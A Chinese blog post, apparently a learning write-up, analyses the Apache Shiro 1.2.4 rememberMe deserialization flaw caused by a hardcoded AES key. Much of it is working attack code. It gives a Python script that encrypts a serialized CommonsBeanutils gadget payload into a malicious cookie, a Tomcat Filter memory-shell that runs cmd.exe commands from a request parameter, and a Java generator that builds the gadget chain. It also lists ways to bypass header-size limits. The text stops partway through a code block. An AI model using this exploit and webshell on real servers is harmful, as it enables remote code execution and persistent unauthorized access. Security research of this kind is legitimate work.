@@ -1,0 +1,1129 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <title>Shiro | Arcueid&#39;s BLOG</title>
+    <meta name="author" content="Arcueid" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <link rel="icon" href="/images/Arcueid.jpg" />
+    <link rel="preconnect" href="https://cdn.staticfile.net" />
+<script src="https://cdn.staticfile.net/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.net/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://cdn.staticfile.net/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://cdn.staticfile.net/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://cdn.staticfile.net/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+<script src="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.js"></script>
+<script src="https://cdn.staticfile.net/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.css" />
+<script src="/js/lib/math.js"></script>
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>ARCUEID&#39;S BLOG</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;ARCUEID&#39;S BLOG</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>Shiro</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/4/16
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/java/" style="color: #00a596">java</a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <p>版本<code>TOMCAT 8.5.98 jdk8u65</code></p>
+<h1 id="分析小技巧"><a href="#分析小技巧" class="headerlink" title="分析小技巧"></a>分析小技巧</h1><p>通过diff来快速查看修复了哪儿 以确定漏洞出现点</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/apache/shiro/compare/shiro-root-1.7.0...shiro-root-1.7.1">https://github.com/apache/shiro/compare/shiro-root-1.7.0...shiro-root-1.7.1</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/[xxxx]/compare/[xxx]...[xxx]">https://github.com/[xxxx]/compare/[xxx]...[xxx]</a></p>
+<span id="more"></span>
+
+<h1 id="Shiro-介绍"><a href="#Shiro-介绍" class="headerlink" title="Shiro 介绍"></a>Shiro 介绍</h1><p>shiro是一个安全框架 包括如下功能和特性 <code>身份认证 授权 会话管理 加密 用户权限 缓存</code></p>
+<p>在Shiro中所有的操作基于Subject(当前正在执行的用户) 在用户任意代码位置都可以取到这个Subject</p>
+<p>Shiro 将所有的操作都抽象为 Permission，并默认使用 <code>Wildcard Permissions</code> 来进行匹配 这里的 <code>Wildcard Permissions</code> 理解为可以通过通配符验证即可</p>
+<h1 id="Demo搭建"><a href="#Demo搭建" class="headerlink" title="Demo搭建"></a>Demo搭建</h1><pre><code class="cmd">克隆之后
+git checkout shiro-root-1.2.4
+</code></pre>
+<p>修改jstl依赖版本为1.2</p>
+<pre><code class="xml">        &lt;dependency&gt;
+            &lt;groupId&gt;javax.servlet&lt;/groupId&gt;
+            &lt;artifactId&gt;jstl&lt;/artifactId&gt;
+            &lt;version&gt;1.2&lt;/version&gt;
+            &lt;scope&gt;runtime&lt;/scope&gt;
+        &lt;/dependency&gt;
+</code></pre>
+<p>创建tomcat启动</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202404161820879.png" alt="image-20240416182019603"></p>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><p>我们去<code>CookieRememberMeManager</code>中打断点看相关逻辑</p>
+<p>getRememberedSerializedIdentity 进行了对cookie的b64解码</p>
+<p>那么我们去看看谁调用了这个方法</p>
+<p><code>getRememberedPrincipals</code></p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202404281723867.png" alt="image-20240428172240408"></p>
+<p>跟进convertBytesToPrincipals</p>
+<p>里面调用了decrypt 解密完进行反序列化</p>
+<p>先不管反序列化的事</p>
+<p>跟进decrypt </p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202404281725088.png" alt="image-20240428172509951"></p>
+<p>进行了一个解密 看看key是什么</p>
+<p>跟进<code>getDecryptionCipherKey</code></p>
+<p>返回的是常量<code>decryptionCipherKey</code></p>
+<p>去看这个常量在哪儿赋初值</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202404281726460.png" alt="image-20240428172621033"></p>
+<p><code>setDecryptionCipherKey</code>被<code>setCipherKey</code>调用</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202404281727380.png" alt="image-20240428172727305"></p>
+<p>被<code>AbstractRememberMeManager</code>调用</p>
+<p>其密钥是硬编码的</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202404281727785.png" alt="image-20240428172739715"></p>
+<p>回头我们看看getRememberedPrincipals</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202404281729085.png" alt="image-20240428172945958"></p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202404281732308.png" alt="image-20240428173258116"></p>
+<p>这里用的是ClassResolvingObjectInputStream而不是原生的ObjectInputStream</p>
+<p>打不了CC链的原因就在这</p>
+<p>至此漏洞原理我们就清楚了</p>
+<p>cookie在通过默认key解密后反序列化</p>
+<p>我们打个无依赖CB链</p>
+<pre><code class="py">import base64
+import os
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad
+
+
+iv = os.urandom(16)
+
+
+key = base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;)
+payload = b&quot;rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LPjgGC/k7xfgIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgBAY29tLnN1bi5vcmcuYXBhY2hlLnhtbC5pbnRlcm5hbC5zZWN1cml0eS5jMTRuLmhlbHBlci5BdHRyQ29tcGFyZZ1IoA3i3IaaAgAAeHB0ABBvdXRwdXRQcm9wZXJ0aWVzdwQAAAADc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0/BbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXEAfgAETAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAA/////3VyAANbW0JL/RkVZ2fbNwIAAHhwAAAAAXVyAAJbQqzzF/gGCFTgAgAAeHAAAAX+yv66vgAAADQANgoACQAlCgAmACcIACgKACYAKQcAKgcAKwoABgAsBwAtBwAuAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAZMRXZpbDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcALwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQANU3RhY2tNYXBUYWJsZQcAKgEAClNvdXJjZUZpbGUBAAlFdmlsLmphdmEMAAoACwcAMAwAMQAyAQAEY2FsYwwAMwA0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uDAAKADUBAARFdmlsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABgoTGphdmEvbGFuZy9UaHJvd2FibGU7KVYAIQAIAAkAAAAAAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAAJAA4AAAAMAAEAAAAFAA8AEAAAAAEAEQASAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAAVAA4AAAAgAAMAAAABAA8AEAAAAAAAAQATABQAAQAAAAEAFQAWAAIAFwAAAAQAAQAYAAEAEQAZAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAAaAA4AAAAqAAQAAAABAA8AEAAAAAAAAQATABQAAQAAAAEAGgAbAAIAAAABABwAHQADABcAAAAEAAEAGAAIAB4ACwABAAwAAABmAAMAAQAAABe4AAISA7YABFenAA1LuwAGWSq3AAe/sQABAAAACQAMAAUAAwANAAAAFgAFAAAADAAJAA8ADAANAA0ADgAWABAADgAAAAwAAQANAAkAHwAgAAAAIQAAAAcAAkwHACIJAAEAIwAAAAIAJHB0AAJhYXB3AQB4c3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAF4&quot;
+
+
+
+def encode(target):
+    aes = AES.new(key, AES.MODE_CBC, iv)
+    res = base64.b64encode(iv+aes.encrypt(pad(target, 16)))
+
+    print(res.decode(&quot;utf-8&quot;))
+
+encode(base64.b64decode(payload))
+</code></pre>
+<p>需要把sessionID去了才会读cookie</p>
+<h1 id="Shiro打内存马"><a href="#Shiro打内存马" class="headerlink" title="Shiro打内存马"></a>Shiro打内存马</h1><p>常规内存马是通过上传jsp 完了访问jsp进行的注册</p>
+<p>这是一个常规Filter内存马</p>
+<pre><code class="jsp">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot; %&gt;
+&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationFilterConfig&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.Context&quot; %&gt;
+&lt;%@ page import=&quot;java.lang.reflect.Constructor&quot; %&gt;
+&lt;%@ page import=&quot;java.util.Map&quot; %&gt;
+&lt;%!
+    public class EvilFilter implements Filter &#123;
+        @Override
+        public void init(FilterConfig filterConfig) throws ServletException &#123;        &#125;
+
+        @Override
+        public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException &#123;
+            HttpServletRequest servletRequest = (HttpServletRequest)request;
+            String cmd = servletRequest.getParameter(&quot;cmd&quot;);
+            BufferedReader br = null;
+            if (cmd != null) &#123;
+                InputStream in = null;
+                try &#123;
+                    in = Runtime.getRuntime().exec(new String[]&#123;&quot;cmd.exe&quot;,&quot;/c&quot;,cmd&#125;).getInputStream();
+                &#125; catch (IOException e) &#123;
+                    throw new RuntimeException(e);
+                &#125;
+                br = new BufferedReader(new InputStreamReader(in));
+                Field fieldRequest = null;
+                try &#123;
+                    fieldRequest = servletRequest.getClass().getDeclaredField(&quot;request&quot;);
+                &#125; catch (NoSuchFieldException e) &#123;
+                    throw new RuntimeException(e);
+                &#125;
+                fieldRequest.setAccessible(true);
+                try &#123;
+                    response.getWriter().write(br.lines().collect(Collectors.joining(&quot;\n&quot;)));
+                &#125; catch (IOException e) &#123;
+                    throw new RuntimeException(e);
+                &#125;
+            &#125;
+        &#125;
+
+        @Override
+        public void destroy() &#123;&#125;
+
+    &#125;
+%&gt;
+
+&lt;%
+    String filterName = &quot;EvilFilter&quot;;
+    EvilFilter filter = new EvilFilter();
+
+    FilterMap filterMap = new FilterMap();
+    filterMap.setFilterName(filterName);
+    filterMap.setDispatcher(DispatcherType.REQUEST.name());
+    filterMap.addURLPattern(&quot;/*&quot;);
+
+    FilterDef filterDef = new FilterDef();
+    filterDef.setFilter(filter);
+    filterDef.setFilterClass(filter.getClass().getSimpleName());
+    filterDef.setFilterName(filterName);
+
+    Constructor&lt;ApplicationFilterConfig&gt; cons = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
+    cons.setAccessible(true);
+
+
+    try &#123;
+        Field fieldRequest = request.getClass().getDeclaredField(&quot;request&quot;);
+        fieldRequest.setAccessible(true);
+        Request req = (Request) fieldRequest.get(request);
+        StandardContext context = (StandardContext) req.getContext();
+
+        Field fieldFilterConfigs = context.getClass().getDeclaredField(&quot;filterConfigs&quot;);
+        fieldFilterConfigs.setAccessible(true);
+        Map filterConfigs = (Map)fieldFilterConfigs.get(context);
+
+        context.addFilterDef(filterDef);
+        context.addFilterMapBefore(filterMap);
+        ApplicationFilterConfig filterConfig = cons.newInstance(context, filterDef);
+        filterConfigs.put(filterName,filterConfig);
+    &#125; catch (NoSuchFieldException e) &#123;
+        throw new RuntimeException(e);
+    &#125;
+
+%&gt;
+</code></pre>
+<p>可以看见context对象的获取是通过request </p>
+<p>当没有request的时候可以通过webappClassLoaderBase来获取 仅限tomcat 8 9</p>
+<pre><code>        WebappClassLoaderBase webappClassLoaderBase =(WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
+        Field ressourcesField = WebappClassLoaderBase.class.getDeclaredField(&quot;resources&quot;);
+        ressourcesField.setAccessible(true);
+        StandardRoot stdRoot = (StandardRoot) ressourcesField.get(webappClassLoaderBase);
+        StandardContext context = (StandardContext)stdRoot.getContext();
+</code></pre>
+<p>最终我们的EvilClass是要转字节数组传入templatesImpl的 所以需要继承AbstractTranslet类</p>
+<pre><code class="jsp">&lt;%!
+    public class EvilFilter extends AbstractTranslet implements Filter &#123;
+        @Override
+        public void init(FilterConfig filterConfig) throws ServletException &#123;        &#125;
+
+        @Override
+        public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException &#123;
+            HttpServletRequest servletRequest = (HttpServletRequest)request;
+            String cmd = servletRequest.getParameter(&quot;cmd&quot;);
+            BufferedReader br = null;
+            if (cmd != null) &#123;
+                InputStream in = null;
+                try &#123;
+                    in = Runtime.getRuntime().exec(new String[]&#123;&quot;cmd.exe&quot;,&quot;/c&quot;,cmd&#125;).getInputStream();
+                &#125; catch (IOException e) &#123;
+                    throw new RuntimeException(e);
+                &#125;
+                br = new BufferedReader(new InputStreamReader(in));
+                Field fieldRequest = null;
+                try &#123;
+                    fieldRequest = servletRequest.getClass().getDeclaredField(&quot;request&quot;);
+                &#125; catch (NoSuchFieldException e) &#123;
+                    throw new RuntimeException(e);
+                &#125;
+                fieldRequest.setAccessible(true);
+                try &#123;
+                    response.getWriter().write(br.lines().collect(Collectors.joining(&quot;\n&quot;)));
+                &#125; catch (IOException e) &#123;
+                    throw new RuntimeException(e);
+                &#125;
+            &#125;
+        &#125;
+
+        @Override
+        public void destroy() &#123;&#125;
+
+        @Override
+        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;
+
+        &#125;
+
+        @Override
+        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;
+
+        &#125;
+    &#125;
+%&gt;
+</code></pre>
+<p>现在恶意类有了 如何注入呢?</p>
+<p>写到静态代码块中 在类初始化的时机进行注入</p>
+<pre><code class="java">    public class EvilFilter extends AbstractTranslet implements Filter,Serializable &#123;
+        static&#123;
+            String filterName = &quot;EvilFilter&quot;;
+            EvilFilter filter = new EvilFilter();
+
+            FilterMap filterMap = new FilterMap();
+            filterMap.setFilterName(filterName);
+            filterMap.setDispatcher(DispatcherType.REQUEST.name());
+            filterMap.addURLPattern(&quot;/*&quot;);
+
+            FilterDef filterDef = new FilterDef();
+            filterDef.setFilter(filter);
+            filterDef.setFilterClass(filter.getClass().getSimpleName());
+            filterDef.setFilterName(filterName);
+
+            Constructor&lt;ApplicationFilterConfig&gt; cons = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
+            cons.setAccessible(true);
+            try &#123;
+                WebappClassLoaderBase webappClassLoaderBase =(WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
+                Field ressourcesField = WebappClassLoaderBase.class.getDeclaredField(&quot;resources&quot;);
+                ressourcesField.setAccessible(true);
+                StandardRoot stdRoot = (StandardRoot) ressourcesField.get(webappClassLoaderBase);
+                StandardContext context = (StandardContext)stdRoot.getContext();
+
+
+
+                Field fieldFilterConfigs = context.getClass().getDeclaredField(&quot;filterConfigs&quot;);
+                fieldFilterConfigs.setAccessible(true);
+                Map filterConfigs = (Map)fieldFilterConfigs.get(context);
+
+                context.addFilterDef(filterDef);
+                context.addFilterMapBefore(filterMap);
+                ApplicationFilterConfig filterConfig = cons.newInstance(context, filterDef);
+                filterConfigs.put(filterName,filterConfig);
+            &#125; catch (NoSuchFieldException e) &#123;
+                throw new RuntimeException(e);
+            &#125;
+
+        &#125;
+
+        @Override
+        public void init(FilterConfig filterConfig) throws ServletException &#123;        &#125;
+
+        @Override
+        public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException &#123;
+            HttpServletRequest servletRequest = (HttpServletRequest)request;
+            String cmd = servletRequest.getParameter(&quot;cmd&quot;);
+            BufferedReader br = null;
+            if (cmd != null) &#123;
+                InputStream in = null;
+                try &#123;
+                    in = Runtime.getRuntime().exec(new String[]&#123;&quot;cmd.exe&quot;,&quot;/c&quot;,cmd&#125;).getInputStream();
+                &#125; catch (IOException e) &#123;
+                    throw new RuntimeException(e);
+                &#125;
+                br = new BufferedReader(new InputStreamReader(in));
+                Field fieldRequest = null;
+                try &#123;
+                    fieldRequest = servletRequest.getClass().getDeclaredField(&quot;request&quot;);
+                &#125; catch (NoSuchFieldException e) &#123;
+                    throw new RuntimeException(e);
+                &#125;
+                fieldRequest.setAccessible(true);
+                try &#123;
+                    response.getWriter().write(br.lines().collect(Collectors.joining(&quot;\n&quot;)));
+                &#125; catch (IOException e) &#123;
+                    throw new RuntimeException(e);
+                &#125;
+            &#125;
+        &#125;
+
+        @Override
+        public void destroy() &#123;&#125;
+
+        @Override
+        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;
+
+        &#125;
+
+        @Override
+        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;
+
+        &#125;
+    &#125;
+</code></pre>
+<p>通过如下代码构造payload</p>
+<pre><code class="java">package com.arcueid;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;
+import javassist.ClassPool;
+import javassist.CtClass;
+import org.apache.commons.beanutils.BeanComparator;
+
+import java.io.ByteArrayOutputStream;
+import java.io.IOException;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.util.Base64;
+import java.util.PriorityQueue;
+
+public class Gen &#123;
+    public static void main(String []args) throws Exception &#123;
+        ClassPool pool = ClassPool.getDefault();
+        CtClass clazz = pool.get(EvilFilter.class.getName());
+        byte[] payloads = clazz.toBytecode();
+
+        byte[][] _bytecodes = new byte[][]&#123;payloads&#125;;
+        TemplatesImpl templates = new TemplatesImpl();
+        Field fieldBytecodes = templates.getClass().getDeclaredField(&quot;_bytecodes&quot;);
+        Field fieldName = templates.getClass().getDeclaredField(&quot;_name&quot;);
+        Field fieldTfactory = templates.getClass().getDeclaredField(&quot;_tfactory&quot;);
+        fieldBytecodes.setAccessible(true);
+        fieldName.setAccessible(true);
+        fieldTfactory.setAccessible(true);
+        fieldBytecodes.set(templates,_bytecodes);
+        fieldName.set(templates,&quot;aa&quot;);
+        fieldTfactory.set(templates,new TransformerFactoryImpl());
+
+//        PropertyUtils.getProperty(templates, &quot;outputProperties&quot;);
+
+        BeanComparator beanComparator = new BeanComparator(&quot;outputProperties&quot;,new AttrCompare());
+
+
+        PriorityQueue&lt;Object&gt; priorityQueue = new PriorityQueue&lt;&gt;();
+        priorityQueue.add(2);
+        priorityQueue.add(1);
+
+
+
+        Field fieldComparator = PriorityQueue.class.getDeclaredField(&quot;comparator&quot;);
+        fieldComparator.setAccessible(true);
+        fieldComparator.set(priorityQueue,beanComparator);
+
+        Field fieldQueue = PriorityQueue.class.getDeclaredField(&quot;queue&quot;);
+        fieldQueue.setAccessible(true);
+        fieldQueue.set(priorityQueue,new Object[]&#123;templates,1&#125;);
+        byte[] bytes = serialize(priorityQueue);
+
+        Base64.Encoder encoder = Base64.getEncoder();
+        String res = encoder.encodeToString(bytes);
+        System.out.println(res);
+
+
+
+    &#125;
+    public static byte[] serialize(Object obj) throws IOException &#123;
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(baos);
+        oos.writeObject(obj);
+        return baos.toByteArray();
+    &#125;
+&#125;
+</code></pre>
+<pre><code class="py">import base64
+import os
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad
+
+
+iv = os.urandom(16)
+
+
+key = base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;)
+payload = b&quot;&quot;
+
+def encode(target):
+    aes = AES.new(key, AES.MODE_CBC, iv)
+    res = base64.b64encode(iv+aes.encrypt(pad(target, 16)))
+
+    print(res.decode(&quot;utf-8&quot;))
+
+
+encode(base64.b64decode(payload))
+
+</code></pre>
+<p>直接打 发现爆400 请求头太大</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202406011116081.png" alt="image-20240601111640609"></p>
+<p>这里先不管绕过的事</p>
+<p>修改server.xml</p>
+<pre><code class="xml">&lt;Connector port=&quot;8080&quot; protocol=&quot;HTTP/1.1&quot;
+           connectionTimeout=&quot;20000&quot;
+           redirectPort=&quot;8443&quot;
+           maxParameterCount=&quot;1000&quot;
+           maxHttpHeaderSize=&quot;40960000&quot;
+           /&gt;
+</code></pre>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202406011131841.png" alt="image-20240601113117669"></p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202406011128483.png" alt="image-20240601112827388"></p>
+<h1 id="绕过请求头长度限制"><a href="#绕过请求头长度限制" class="headerlink" title="绕过请求头长度限制"></a>绕过请求头长度限制</h1><ol>
+<li>反射修改 AbstractHttp11Protocol 的 maxHeaderSize(不稳定)</li>
+<li>gzip + base64压缩编码</li>
+<li>从外部或从 HTTP 请求 body 中加载类字节码</li>
+</ol>
+<p>这里就记录下3的学习</p>
+<p>首先是拿到request</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/350482.html">https://www.freebuf.com/vuls/350482.html</a></p>
+<p>拿到之后从参数里读字节码defineClass就行</p>
+<p>代码如下</p>
+<p><code>Gen.java</code> 生成rememberMe cookie</p>
+<pre><code class="java">package com.arcueid;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;
+import javassist.ClassPool;
+import javassist.CtClass;
+import org.apache.commons.beanutils.BeanComparator;
+
+import javax.crypto.Cipher;
+import javax.crypto.spec.IvParameterSpec;
+import javax.crypto.spec.SecretKeySpec;
+import java.io.ByteArrayOutputStream;
+import java.io.IOException;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.util.Base64;
+import java.util.PriorityQueue;
+
+public class Gen &#123;
+    public static void main(String []args) throws Exception &#123;
+        ClassPool pool = ClassPool.getDefault();
